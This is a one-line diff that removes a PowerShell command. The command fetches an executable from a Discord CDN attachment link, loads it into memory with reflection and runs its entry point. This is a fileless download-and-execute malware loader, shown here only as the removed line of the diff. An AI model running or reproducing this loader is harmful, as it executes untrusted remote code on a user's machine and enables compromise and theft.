@@ -1,1 +1,0 @@
-([System.Reflection.Assembly]::Load((Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/1207526166617915422/1335420078602326054/xyz.exe?ex=67a0c31d&is=679f719d&hm=b426d08fa42b3293c7ad36bda255ec85e19b8712ccc26d6a36256847a1aef9e8&" -UseBasicParsing).Content)).EntryPoint.Invoke($null, $null) #key
